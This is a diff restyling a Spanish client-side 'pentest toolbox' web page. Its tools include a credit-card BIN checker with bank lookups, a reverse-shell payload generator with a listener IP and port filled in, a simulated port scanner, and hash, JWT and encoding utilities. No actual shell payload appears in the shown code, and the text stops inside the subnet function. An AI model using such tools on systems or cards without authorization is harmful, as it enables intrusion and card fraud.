@@ -1,272 +1,250 @@
-```html
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HACKER TOOLBOX v2.0</title>
+    <title>SHADOWVAULT • Pentest Platform</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=VT323&amp;display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@500;600&display=swap');
+        
+        :root {
+            --accent: #00ff9d;
+        }
         body {
-            font-family: 'VT323', monospace;
+            font-family: 'Inter', system-ui, sans-serif;
+        }
+        .title-font {
+            font-family: 'Space Grotesk', sans-serif;
         }
         .matrix-bg {
-            background: linear-gradient(180deg, #0a0e17 0%, #000000 100%);
+            background: #0a0c12;
             background-image: 
-                linear-gradient(rgba(0, 255, 70, 0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 255, 70, 0.03) 1px, transparent 1px);
-            background-size: 50px 50px;
+                linear-gradient(rgba(0, 255, 157, 0.04) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 157, 0.04) 1px, transparent 1px);
+            background-size: 60px 60px;
         }
-        .neon-green {
-            text-shadow: 0 0 10px #00ff41,
-                        0 0 20px #00ff41;
+        .neon-text {
+            text-shadow: 0 0 15px var(--accent),
+                        0 0 30px var(--accent);
         }
         .card {
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            background: rgba(15, 23, 42, 0.85);
+            border: 1px solid rgba(0, 255, 157, 0.15);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
         }
         .card:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 0 25px rgba(0, 255, 136, 0.3);
+            border-color: rgba(0, 255, 157, 0.4);
+            transform: translateY(-6px);
+            box-shadow: 0 20px 25px -5px rgb(0 0 0 / 0.1), 
+                       0 8px 10px -6px rgb(0 0 0 / 0.1);
         }
         .terminal {
-            font-family: monospace;
-            background: #0a0e17;
-            border: 1px solid #00ff41;
+            font-family: 'Space Grotesk', monospace;
+            background: #0a0c12;
+            border: 1px solid #00ff9d33;
         }
         .tab-active {
-            border-bottom: 3px solid #00ff88;
-            color: #00ff88;
+            color: #00ff9d;
+            border-bottom: 3px solid #00ff9d;
         }
     </style>
 </head>
-<body class="matrix-bg text-[#e0e0e0] min-h-screen">
-    <div class="max-w-7xl mx-auto">
-        <!-- HEADER -->
-        <header class="border-b border-[#00ff41]/30 bg-black/80 backdrop-blur-md sticky top-0 z-50">
-            <div class="flex items-center justify-between px-6 py-4">
-                <div class="flex items-center gap-3">
-                    <i class="fas fa-skull-crossbones text-3xl text-[#00ff41]"></i>
+<body class="matrix-bg text-slate-200 min-h-screen pb-20">
+    <div class="max-w-screen-2xl mx-auto">
+
+        <!-- TOP NAV -->
+        <nav class="bg-black/90 backdrop-blur-xl border-b border-[#00ff9d]/20 sticky top-0 z-50">
+            <div class="px-8 py-5 flex items-center justify-between">
+                <div class="flex items-center gap-4">
+                    <div class="w-9 h-9 bg-[#00ff9d] text-black rounded-xl flex items-center justify-center font-bold text-2xl">SV</div>
                     <div>
-                        <h1 class="text-3xl font-bold neon-green tracking-widest">HACKER TOOLBOX</h1>
-                        <p class="text-xs text-[#00ff88]/70 -mt-1">PENTEST &amp; EDU // CLIENT-SIDE ONLY</p>
+                        <h1 class="title-font text-3xl tracking-tighter neon-text">SHADOWVAULT</h1>
+                        <p class="text-xs text-emerald-400 -mt-1">PENTEST FRAMEWORK • CLIENT-SIDE</p>
                     </div>
                 </div>
-                
-                <div class="flex items-center gap-4">
-                    <div class="relative w-80">
-                        <input id="searchInput" 
+
+                <div class="flex items-center gap-6">
+                    <div class="relative w-96">
+                        <input id="globalSearch" 
                                type="text" 
-                               placeholder="Buscar herramienta..." 
-                               class="w-full bg-black border border-[#00ff41]/50 rounded-lg py-2 px-4 pl-10 text-sm focus:outline-none focus:border-[#00ff88]">
-                        <i class="fas fa-search absolute left-3 top-3 text-[#00ff41]"></i>
+                               placeholder="Buscar herramienta... (Ctrl+K)"
+                               class="w-full bg-zinc-950 border border-[#00ff9d]/30 focus:border-[#00ff9d] rounded-2xl px-5 py-3 text-sm outline-none">
+                        <i class="fas fa-search absolute right-5 top-3.5 text-[#00ff9d]/50"></i>
                     </div>
-                    <button onclick="clearLog()" 
-                            class="px-4 py-2 bg-black border border-red-500/50 hover:border-red-500 text-red-400 text-sm rounded-lg flex items-center gap-2">
-                        <i class="fas fa-trash"></i> LIMPIAR LOG
+                    <button onclick="clearAllLogs()" 
+                            class="flex items-center gap-2 px-5 py-3 bg-zinc-900 hover:bg-red-950/50 border border-red-500/30 hover:border-red-500 rounded-2xl text-sm transition-colors">
+                        <i class="fas fa-trash"></i>
+                        <span>Limpiar</span>
                     </button>
                 </div>
             </div>
-            
+
             <!-- TABS -->
-            <div class="px-6 flex border-t border-[#00ff41]/20 text-sm overflow-x-auto">
-                <button onclick="switchTab(0)" class="tab px-6 py-3 tab-active" data-tab="0">RECON</button>
-                <button onclick="switchTab(1)" class="tab px-6 py-3" data-tab="1">CODECS</button>
-                <button onclick="switchTab(2)" class="tab px-6 py-3" data-tab="2">GENERATORS</button>
-                <button onclick="switchTab(3)" class="tab px-6 py-3" data-tab="3">NETWORK</button>
-                <button onclick="switchTab(4)" class="tab px-6 py-3" data-tab="4">VALIDATORS</button>
+            <div class="px-8 flex gap-8 text-sm font-medium border-t border-[#00ff9d]/10">
+                <button onclick="switchTab(0)" class="tab py-5 tab-active" data-tab="0">RECONOCIMIENTO</button>
+                <button onclick="switchTab(1)" class="tab py-5" data-tab="1">VALIDADORES</button>
+                <button onclick="switchTab(2)" class="tab py-5" data-tab="2">CODECS & HASH</button>
+                <button onclick="switchTab(3)" class="tab py-5" data-tab="3">GENERADORES</button>
+                <button onclick="switchTab(4)" class="tab py-5" data-tab="4">RED & REDES</button>
             </div>
-        </header>
+        </nav>
 
         <div class="flex">
-            <!-- SIDEBAR LOG -->
-            <div class="w-80 border-r border-[#00ff41]/20 bg-black/70 h-[calc(100vh-120px)] overflow-auto p-4 text-xs" id="activityLog">
-                <div class="text-[#00ff88] mb-2 flex items-center gap-2">
+            <!-- LOG PANEL -->
+            <div class="w-80 bg-black/70 border-r border-[#00ff9d]/20 h-[calc(100vh-140px)] overflow-auto p-5 text-xs font-mono" id="activityLog">
+                <div class="flex items-center gap-2 text-emerald-400 mb-4">
                     <i class="fas fa-terminal"></i>
-                    <span>ACTIVITY LOG</span>
+                    <span class="uppercase tracking-widest">Activity Log</span>
                 </div>
             </div>
 
-            <!-- MAIN CONTENT -->
-            <div class="flex-1 p-6 overflow-auto" style="height: calc(100vh - 120px);">
+            <!-- MAIN AREA -->
+            <div class="flex-1 p-8 overflow-auto" style="height: calc(100vh - 140px);">
                 
-                <!-- TAB 0: RECON -->
-                <div id="tab-0" class="tab-content">
-                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-                        <!-- BIN CHECKER -->
-                        <div class="card bg-[#0f1620] border border-[#00ff41]/30 rounded-xl p-5">
-                            <h2 class="text-xl mb-4 flex items-center gap-2"><i class="fas fa-credit-card"></i> BIN CHECKER</h2>
-                            <input id="binInput" type="text" maxlength="19" placeholder="Ingrese BIN o tarjeta completa" 
-                                   class="w-full bg-black border border-[#00ff41]/50 rounded p-3 text-lg mb-4 focus:outline-none">
-                            <button onclick="checkBIN()" 
-                                    class="w-full bg-[#00ff41] text-black font-bold py-3 rounded hover:bg-[#00ff88]">ANALIZAR</button>
-                            <div id="binResult" class="mt-4 terminal p-4 text-sm min-h-[180px]"></div>
-                        </div>
+                <!-- ==================== TAB 0: RECON ==================== -->
+                <div id="tab-0" class="tab-content grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6">
+                    <!-- BIN Checker -->
+                    <div class="card rounded-3xl p-6">
+                        <h2 class="text-xl font-semibold mb-5 flex items-center gap-3">
+                            <i class="fas fa-credit-card text-[#00ff9d]"></i> BIN / CARD CHECKER
+                        </h2>
+                        <input id="binInput" maxlength="19" placeholder="4111111111111111 o BIN" 
+                               class="w-full bg-zinc-950 border border-zinc-700 focus:border-[#00ff9d] rounded-2xl px-5 py-4 text-lg">
+                        <button onclick="checkBIN()" class="mt-4 w-full bg-[#00ff9d] hover:bg-emerald-400 text-black font-bold py-4 rounded-2xl transition">ANALIZAR TARJETA</button>
+                        <div id="binResult" class="terminal mt-5 p-5 text-sm min-h-[220px] rounded-2xl"></div>
+                    </div>
 
-                        <!-- SUBNET CALCULATOR -->
-                        <div class="card bg-[#0f1620] border border-[#00ff41]/30 rounded-xl p-5">
-                            <h2 class="text-xl mb-4 flex items-center gap-2"><i class="fas fa-network-wired"></i> SUBNET CALC</h2>
-                            <div class="grid grid-cols-2 gap-3">
-                                <input id="subnetIP" placeholder="IP (ej: 192.168.1.0)" class="bg-black border border-[#00ff41]/50 rounded p-3">
-                                <input id="subnetCIDR" placeholder="/24" class="bg-black border border-[#00ff41]/50 rounded p-3">
-                            </div>
-                            <button onclick="calculateSubnet()" class="mt-4 w-full bg-[#00ff41] text-black py-3 rounded">CALCULAR</button>
-                            <div id="subnetResult" class="mt-4 terminal p-4 text-xs"></div>
+                    <!-- Subnet Calculator -->
+                    <div class="card rounded-3xl p-6">
+                        <h2 class="text-xl font-semibold mb-5 flex items-center gap-3">
+                            <i class="fas fa-network-wired text-[#00ff9d]"></i> SUBNET CALCULATOR
+                        </h2>
+                        <div class="grid grid-cols-2 gap-4">
+                            <input id="subnetIP" value="192.168.10.0" class="bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4">
+                            <input id="subnetCIDR" value="/24" class="bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4">
                         </div>
+                        <button onclick="calculateSubnet()" class="mt-6 w-full bg-[#00ff9d] text-black font-bold py-4 rounded-2xl">CALCULAR SUBRED</button>
+                        <div id="subnetResult" class="terminal mt-5 p-5 text-sm rounded-2xl"></div>
+                    </div>
 
-                        <!-- DNS TOOLKIT -->
-                        <div class="card bg-[#0f1620] border border-[#00ff41]/30 rounded-xl p-5">
-                            <h2 class="text-xl mb-4 flex items-center gap-2"><i class="fas fa-globe"></i> DNS LOOKUP</h2>
-                            <input id="dnsDomain" placeholder="example.com" class="w-full bg-black border border-[#00ff41]/50 rounded p-3 mb-3">
-                            <select id="dnsType" class="w-full bg-black border border-[#00ff41]/50 rounded p-3 mb-3">
-                                <option value="A">A</option>
-                                <option value="AAAA">AAAA</option>
-                                <option value="MX">MX</option>
-                                <option value="NS">NS</option>
-                                <option value="TXT">TXT</option>
-                            </select>
-                            <button onclick="dnsLookup()" class="w-full bg-[#00ff41] text-black py-3 rounded">CONSULTAR</button>
-                            <div id="dnsResult" class="mt-4 terminal p-4 text-xs overflow-auto max-h-60"></div>
-                        </div>
+                    <!-- DNS Lookup -->
+                    <div class="card rounded-3xl p-6">
+                        <h2 class="text-xl font-semibold mb-5 flex items-center gap-3">
+                            <i class="fas fa-dns text-[#00ff9d]"></i> DNS LOOKUP
+                        </h2>
+                        <input id="dnsDomain" placeholder="google.com" class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4 mb-4">
+                        <button onclick="dnsLookup()" class="w-full bg-[#00ff9d] text-black font-bold py-4 rounded-2xl">CONSULTAR DNS</button>
+                        <div id="dnsResult" class="terminal mt-5 p-5 text-sm max-h-64 overflow-auto rounded-2xl"></div>
                     </div>
                 </div>
 
-                <!-- TAB 1: CODECS -->
-                <div id="tab-1" class="tab-content hidden">
-                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
-                        <!-- HASH GENERATOR -->
-                        <div class="card bg-[#0f1620] border border-[#00ff41]/30 rounded-xl p-5">
-                            <h2 class="text-xl mb-4"><i class="fas fa-key"></i> HASH GENERATOR</h2>
-                            <textarea id="hashInput" rows="3" class="w-full bg-black border border-[#00ff41]/50 rounded p-3" placeholder="Texto para hashear..."></textarea>
-                            <div class="grid grid-cols-3 gap-2 mt-4">
-                                <button onclick="generateHash('MD5')" class="bg-[#1a2533] hover:bg-[#00ff41]/20 py-2 rounded">MD5</button>
-                                <button onclick="generateHash('SHA256')" class="bg-[#1a2533] hover:bg-[#00ff41]/20 py-2 rounded">SHA-256</button>
-                                <button onclick="generateHash('SHA512')" class="bg-[#1a2533] hover:bg-[#00ff41]/20 py-2 rounded">SHA-512</button>
-                            </div>
-                            <div id="hashOutput" class="mt-6 terminal p-4 text-xs break-all"></div>
-                        </div>
+                <!-- ==================== TAB 1: VALIDADORES ==================== -->
+                <div id="tab-1" class="tab-content hidden grid grid-cols-1 md:grid-cols-2 gap-6">
+                    <div class="card rounded-3xl p-6">
+                        <h2 class="text-xl font-semibold mb-5"><i class="fas fa-university"></i> IBAN VALIDATOR</h2>
+                        <input id="ibanInput" placeholder="ES9121000418450200051332" class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4">
+                        <button onclick="validateIBAN()" class="mt-4 w-full bg-[#00ff9d] text-black font-bold py-4 rounded-2xl">VALIDAR IBAN</button>
+                        <div id="ibanResult" class="terminal mt-5 p-5 rounded-2xl"></div>
+                    </div>
 
-                        <!-- ENCODERS -->
-                        <div class="card bg-[#0f1620] border border-[#00ff41]/30 rounded-xl p-5">
-                            <h2 class="text-xl mb-4"><i class="fas fa-exchange-alt"></i> CODIFICADORES</h2>
-                            <div class="flex gap-2 mb-3">
-                                <input id="encodeInput" class="flex-1 bg-black border border-[#00ff41]/50 rounded p-3" placeholder="Texto...">
-                                <button onclick="encodeBase64()" class="px-6 bg-[#00ff41] text-black rounded">B64</button>
-                            </div>
-                            <div id="encodeOutput" class="terminal p-4 min-h-[120px] text-sm"></div>
-                            <div class="flex gap-2 mt-4 text-xs">
-                                <button onclick="rot13()" class="flex-1 py-2 bg-[#1a2533]">ROT13</button>
-                                <button onclick="xorCipher()" class="flex-1 py-2 bg-[#1a2533]">XOR</button>
-                            </div>
-                        </div>
+                    <div class="card rounded-3xl p-6">
+                        <h2 class="text-xl font-semibold mb-5"><i class="fas fa-key"></i> JWT DECODER</h2>
+                        <textarea id="jwtInput" rows="4" placeholder="Pega tu JWT aquí..." class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl p-5 font-mono text-sm"></textarea>
+                        <button onclick="decodeJWT()" class="mt-4 w-full bg-[#00ff9d] text-black font-bold py-4 rounded-2xl">DECODIFICAR JWT</button>
+                        <div id="jwtResult" class="terminal mt-5 p-5 text-xs rounded-2xl overflow-auto max-h-80"></div>
                     </div>
                 </div>
 
-                <!-- TAB 2: GENERATORS -->
+                <!-- ==================== TAB 2: CODECS & HASH ==================== -->
                 <div id="tab-2" class="tab-content hidden">
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                        <!-- PASSWORD GENERATOR -->
-                        <div class="card bg-[#0f1620] border border-[#00ff41]/30 rounded-xl p-5">
-                            <h2 class="text-xl mb-4"><i class="fas fa-lock"></i> PASSWORD GEN</h2>
-                            <div class="flex items-center gap-4 mb-4">
-                                <input id="passLength" type="number" value="16" class="w-20 bg-black border border-[#00ff41]/50 rounded p-3 text-center">
-                                <label class="flex items-center gap-2"><input type="checkbox" id="incUpper" checked> May</label>
-                                <label class="flex items-center gap-2"><input type="checkbox" id="incLower" checked> Min</label>
-                                <label class="flex items-center gap-2"><input type="checkbox" id="incNum" checked> Num</label>
-                                <label class="flex items-center gap-2"><input type="checkbox" id="incSym" checked> Sym</label>
+                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                        <div class="card rounded-3xl p-6">
+                            <h2 class="text-xl font-semibold mb-5">HASH GENERATOR</h2>
+                            <textarea id="hashInput" rows="3" class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl p-5"></textarea>
+                            <div class="grid grid-cols-4 gap-3 mt-6">
+                                <button onclick="generateHash('SHA-256')" class="py-3 bg-zinc-800 hover:bg-emerald-900 rounded-2xl">SHA-256</button>
+                                <button onclick="generateHash('SHA-512')" class="py-3 bg-zinc-800 hover:bg-emerald-900 rounded-2xl">SHA-512</button>
+                                <button onclick="generateHash('MD5')" class="py-3 bg-zinc-800 hover:bg-emerald-900 rounded-2xl">MD5</button>
                             </div>
-                            <button onclick="generatePassword()" class="w-full bg-[#00ff41] text-black py-4 text-xl rounded mb-4">GENERAR</button>
-                            <div id="passwordOutput" onclick="copyToClipboard(this)" class="terminal p-6 text-2xl text-center cursor-pointer break-all"></div>
-                            <div id="entropy" class="text-xs mt-2 text-center"></div>
+                            <div id="hashOutput" class="terminal mt-6 p-6 text-sm break-all rounded-2xl"></div>
                         </div>
 
-                        <!-- REVERSE SHELLS -->
-                        <div class="card bg-[#0f1620] border border-[#00ff41]/30 rounded-xl p-5">
-                            <h2 class="text-xl mb-4"><i class="fas fa-terminal"></i> REVERSE SHELLS</h2>
-                            <input id="revIP" placeholder="Tu IP" value="192.168.1.100" class="w-full mb-3 bg-black border border-[#00ff41]/50 rounded p-3">
-                            <input id="revPort" placeholder="Puerto" value="4444" class="w-full mb-4 bg-black border border-[#00ff41]/50 rounded p-3">
-                            <select id="shellType" class="w-full bg-black border border-[#00ff41]/50 rounded p-3 mb-4">
-                                <option value="bash">Bash</option>
-                                <option value="python">Python</option>
-                                <option value="powershell">PowerShell</option>
-                            </select>
-                            <button onclick="generateShell()" class="w-full bg-[#00ff41] text-black py-3 rounded">GENERAR PAYLOAD</button>
-                            <pre id="shellOutput" class="terminal p-4 mt-4 text-xs overflow-auto max-h-60"></pre>
+                        <div class="card rounded-3xl p-6">
+                            <h2 class="text-xl font-semibold mb-5">CODIFICADORES</h2>
+                            <input id="encodeInput" class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4" placeholder="Texto a codificar">
+                            <div class="grid grid-cols-3 gap-3 mt-6">
+                                <button onclick="encodeBase64()" class="py-4 bg-zinc-800 hover:bg-emerald-900 rounded-2xl">Base64</button>
+                                <button onclick="rot13()" class="py-4 bg-zinc-800 hover:bg-emerald-900 rounded-2xl">ROT13</button>
+                                <button onclick="urlEncode()" class="py-4 bg-zinc-800 hover:bg-emerald-900 rounded-2xl">URL Encode</button>
+                            </div>
+                            <div id="encodeOutput" class="terminal mt-6 p-6 min-h-32 rounded-2xl"></div>
                         </div>
                     </div>
                 </div>
 
-                <!-- TAB 3: NETWORK -->
-                <div id="tab-3" class="tab-content hidden">
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                        <!-- PORT SCANNER -->
-                        <div class="card bg-[#0f1620] border border-[#00ff41]/30 rounded-xl p-5">
-                            <h2 class="text-xl mb-4"><i class="fas fa-plug"></i> PORT SCANNER (SIM)</h2>
-                            <input id="scanTarget" placeholder="IP o dominio" value="example.com" class="w-full bg-black border border-[#00ff41]/50 rounded p-3 mb-4">
-                            <button onclick="simulatePortScan()" class="w-full bg-[#00ff41] text-black py-3 rounded">ESCANEAR PUERTOS</button>
-                            <div id="scanResult" class="mt-6 terminal p-4 text-xs max-h-96 overflow-auto"></div>
+                <!-- ==================== TAB 3: GENERADORES ==================== -->
+                <div id="tab-3" class="tab-content hidden grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div class="card rounded-3xl p-6">
+                        <h2 class="text-xl font-semibold mb-5 flex items-center gap-3"><i class="fas fa-lock"></i> PASSWORD GENERATOR</h2>
+                        <div class="flex gap-4 items-center">
+                            <input id="passLength" type="number" value="20" class="w-24 text-center bg-zinc-950 border border-zinc-700 rounded-2xl py-4">
+                            <div class="flex gap-6">
+                                <label><input type="checkbox" id="incUpper" checked> Mayúsculas</label>
+                                <label><input type="checkbox" id="incLower" checked> Minúsculas</label>
+                                <label><input type="checkbox" id="incNum" checked> Números</label>
+                                <label><input type="checkbox" id="incSym" checked> Símbolos</label>
+                            </div>
                         </div>
+                        <button onclick="generatePassword()" class="mt-6 w-full bg-[#00ff9d] text-black font-bold py-6 text-xl rounded-3xl">GENERAR CONTRASEÑA SEGURA</button>
+                        <div id="passwordOutput" onclick="copyToClipboard(this)" class="terminal mt-6 p-8 text-2xl text-center cursor-pointer rounded-3xl break-all"></div>
+                    </div>
 
-                        <!-- URL TOOLKIT -->
-                        <div class="card bg-[#0f1620] border border-[#00ff41]/30 rounded-xl p-5">
-                            <h2 class="text-xl mb-4"><i class="fas fa-link"></i> URL TOOLKIT</h2>
-                            <input id="urlInput" placeholder="https://example.com/?q=test" class="w-full bg-black border border-[#00ff41]/50 rounded p-3 mb-3">
-                            <button onclick="parseURL()" class="w-full bg-[#00ff41] text-black py-3 rounded mb-4">PARSEAR URL</button>
-                            <div id="urlParsed" class="terminal p-4 text-xs"></div>
-                        </div>
+                    <div class="card rounded-3xl p-6">
+                        <h2 class="text-xl font-semibold mb-5"><i class="fas fa-terminal"></i> REVERSE SHELL GENERATOR</h2>
+                        <input id="revIP" value="10.0.0.5" class="w-full mb-4 bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4">
+                        <input id="revPort" value="4444" class="w-full mb-6 bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4">
+                        <button onclick="generateShell()" class="w-full bg-[#00ff9d] text-black font-bold py-5 rounded-3xl">GENERAR PAYLOAD</button>
+                        <pre id="shellOutput" class="terminal mt-6 p-6 text-xs overflow-auto max-h-80 rounded-3xl"></pre>
                     </div>
                 </div>
 
-                <!-- TAB 4: VALIDATORS -->
+                <!-- ==================== TAB 4: RED ==================== -->
                 <div id="tab-4" class="tab-content hidden">
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                        <!-- IBAN -->
-                        <div class="card bg-[#0f1620] border border-[#00ff41]/30 rounded-xl p-5">
-                            <h2 class="text-xl mb-4"><i class="fas fa-university"></i> IBAN VALIDATOR</h2>
-                            <input id="ibanInput" placeholder="ES9121000418450200051332" class="w-full bg-black border border-[#00ff41]/50 rounded p-3 mb-4">
-                            <button onclick="validateIBAN()" class="w-full bg-[#00ff41] text-black py-3 rounded">VALIDAR IBAN</button>
-                            <div id="ibanResult" class="mt-4 terminal p-4"></div>
-                        </div>
-
-                        <!-- JWT -->
-                        <div class="card bg-[#0f1620] border border-[#00ff41]/30 rounded-xl p-5">
-                            <h2 class="text-xl mb-4"><i class="fas fa-ticket-alt"></i> JWT DECODER</h2>
-                            <textarea id="jwtInput" rows="3" class="w-full bg-black border border-[#00ff41]/50 rounded p-3" placeholder="eyJ..."></textarea>
-                            <button onclick="decodeJWT()" class="mt-4 w-full bg-[#00ff41] text-black py-3 rounded">DECODIFICAR</button>
-                            <div id="jwtResult" class="mt-4 terminal p-4 text-xs"></div>
-                        </div>
+                    <div class="card rounded-3xl p-6 max-w-2xl">
+                        <h2 class="text-xl font-semibold mb-5"><i class="fas fa-plug"></i> PORT SCANNER SIMULADO</h2>
+                        <input id="scanTarget" value="192.168.1.1" class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4">
+                        <button onclick="simulatePortScan()" class="mt-6 w-full bg-[#00ff9d] text-black font-bold py-5 rounded-3xl">INICIAR ESCANEO</button>
+                        <div id="scanResult" class="terminal mt-6 p-6 text-sm"></div>
                     </div>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- FOOTER -->
-    <footer class="fixed bottom-0 left-0 right-0 bg-black border-t border-[#00ff41]/30 text-center py-2 text-xs text-[#00ff88]/60">
-        SOLO PARA PRUEBAS DE PENETRACIÓN AUTORIZADAS Y EDUCACIÓN • CLIENT-SIDE ONLY • v2.0
+    <footer class="fixed bottom-0 left-0 right-0 bg-black/90 border-t border-[#00ff9d]/20 py-3 text-center text-xs text-emerald-400/70">
+        SHADOWVAULT • Solo para pruebas de penetración autorizadas y educación en ciberseguridad
     </footer>
 
     <script>
-        // Tailwind script
-        function initTailwind() {
-            // Already included via CDN
-        }
-
-        // Activity Log
-        function logActivity(message, type = 'info') {
+        // ==================== UTILS ====================
+        function logActivity(msg, type = 'info') {
             const log = document.getElementById('activityLog');
-            const time = new Date().toLocaleTimeString('es-ES');
-            const color = type === 'success' ? 'text-green-400' : type === 'error' ? 'text-red-400' : 'text-[#00ff88]';
-            log.innerHTML += `<div class="text-xs ${color}">[${time}] ${message}</div>`;
+            const time = new Date().toLocaleTimeString('es-ES', {hour:'2-digit', minute:'2-digit'});
+            const colors = {success: 'text-emerald-400', error: 'text-red-400', info: 'text-sky-400'};
+            log.innerHTML += `<div class="py-1 ${colors[type] || colors.info}">[${time}] ${msg}</div>`;
             log.scrollTop = log.scrollHeight;
         }
 
-        function clearLog() {
-            document.getElementById('activityLog').innerHTML = `<div class="text-[#00ff88] mb-2 flex items-center gap-2"><i class="fas fa-terminal"></i><span>ACTIVITY LOG</span></div>`;
+        function copyToClipboard(el) {
+            navigator.clipboard.writeText(el.innerText);
+            const orig = el.style.backgroundColor;
+            el.style.backgroundColor = '#00ff9d22';
+            setTimeout(() => el.style.backgroundColor = orig, 400);
+            logActivity('Copiado al portapapeles', 'success');
         }
 
-        // Tab switching
         function switchTab(n) {
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('tab-active'));
             document.querySelectorAll(`button[data-tab="${n}"]`).forEach(t => t.classList.add('tab-active'));
@@ -275,24 +253,24 @@
             document.getElementById(`tab-${n}`).classList.remove('hidden');
         }
 
-        // BIN Database (real examples)
+        function clearAllLogs() {
+            document.getElementById('activityLog').innerHTML = `<div class="flex items-center gap-2 text-emerald-400 mb-4"><i class="fas fa-terminal"></i><span class="uppercase tracking-widest">Activity Log</span></div>`;
+            logActivity('Log limpiado', 'success');
+        }
+
+        // ==================== HERRAMIENTAS ====================
         const binDB = [
-            {bin: "411111", brand: "Visa", type: "Crédito", level: "Classic", bank: "JPMorgan Chase", country: "Estados Unidos", code: "US"},
-            {bin: "510510", brand: "Mastercard", type: "Crédito", level: "Gold", bank: "Bank of America", country: "Estados Unidos", code: "US"},
-            {bin: "340000", brand: "American Express", type: "Crédito", level: "Platinum", bank: "Amex", country: "Estados Unidos", code: "US"},
-            {bin: "601100", brand: "Discover", type: "Crédito", level: "Standard", bank: "Discover", country: "Estados Unidos", code: "US"},
-            {bin: "300000", brand: "Diners Club", type: "Crédito", level: "Classic", bank: "Diners", country: "Estados Unidos", code: "US"},
-            {bin: "454000", brand: "Visa", type: "Débito", level: "Electron", bank: "Santander", country: "España", code: "ES"},
-            {bin: "518000", brand: "Mastercard", type: "Crédito", level: "Platinum", bank: "BBVA", country: "España", code: "ES"},
-            // Add more as needed
+            {bin:"411111", brand:"Visa", type:"Crédito", level:"Classic", bank:"Chase", country:"EE.UU"},
+            {bin:"510510", brand:"Mastercard", type:"Crédito", level:"Gold", bank:"Bank of America", country:"EE.UU"},
+            {bin:"340000", brand:"American Express", type:"Crédito", level:"Platinum", bank:"Amex", country:"EE.UU"},
+            {bin:"454000", brand:"Visa", type:"Débito", level:"Electron", bank:"Santander", country:"España"}
         ];
 
-        function luhnCheck(card) {
-            card = card.replace(/\s+/g, '');
-            let sum = 0;
-            let shouldDouble = false;
-            for (let i = card.length - 1; i >= 0; i--) {
-                let digit = parseInt(card[i]);
+        function luhnCheck(num) {
+            num = num.replace(/\D/g,'');
+            let sum = 0, shouldDouble = false;
+            for (let i = num.length - 1; i >= 0; i--) {
+                let digit = parseInt(num[i]);
                 if (shouldDouble) {
                     digit *= 2;
                     if (digit > 9) digit -= 9;
@@ -305,275 +283,160 @@
 
         function checkBIN() {
             const input = document.getElementById('binInput').value.trim();
-            const resultDiv = document.getElementById('binResult');
-            
             if (!input) return;
-            
-            const bin = input.substring(0, 6);
-            let found = binDB.find(b => b.bin === bin);
-            
-            let html = `<strong>BIN:</strong> ${bin}<br>`;
-            
+            const bin = input.substring(0,6);
+            const found = binDB.find(b => b.bin === bin);
+            const isValid = luhnCheck(input);
+
+            let html = `<strong>BIN:</strong> ${bin}<br><br>`;
             if (found) {
-                html += `<span class="text-green-400">✓ Encontrado en DB</span><br>`;
-                html += `Marca: ${found.brand}<br>`;
+                html += `Marca: <span class="text-emerald-400">${found.brand}</span><br>`;
                 html += `Tipo: ${found.type}<br>`;
                 html += `Nivel: ${found.level}<br>`;
                 html += `Banco: ${found.bank}<br>`;
-                html += `País: ${found.country}<br>`;
-            } else {
-                html += `<span class="text-yellow-400">BIN no encontrado en DB local</span><br>`;
+                html += `País: ${found.country}<br><br>`;
             }
+            html += `Luhn Algorithm: <span class="${isValid?'text-emerald-400':'text-red-400'} font-bold">${isValid ? 'VÁLIDA' : 'INVÁLIDA'}</span>`;
             
-            const isValidLuhn = luhnCheck(input);
-            html += `<br><strong>Luhn:</strong> <span class="${isValidLuhn ? 'text-green-400' : 'text-red-400'}">${isValidLuhn ? 'VÁLIDA' : 'INVÁLIDA'}</span>`;
-            
-            resultDiv.innerHTML = html;
-            logActivity(`BIN check realizado: ${bin}`, isValidLuhn ? 'success' : 'error');
-        }
-
-        // Subnet Calculator
-        function ipToBinary(ip) {
-            return ip.split('.').map(oct => parseInt(oct).toString(2).padStart(8, '0')).join('');
+            document.getElementById('binResult').innerHTML = html;
+            logActivity(`BIN Checker: ${bin}`, isValid ? 'success' : 'error');
         }
 
         function calculateSubnet() {
             const ip = document.getElementById('subnetIP').value;
-            let cidr = parseInt(document.getElementById('subnetCIDR').value.replace('/', ''));
-            
-            if (!ip || isNaN(cidr)) return;
-            
+            const cidr = parseInt(document.getElementById('subnetCIDR').value.replace('/',''));
             const result = document.getElementById('subnetResult');
-            // Simplified calculation
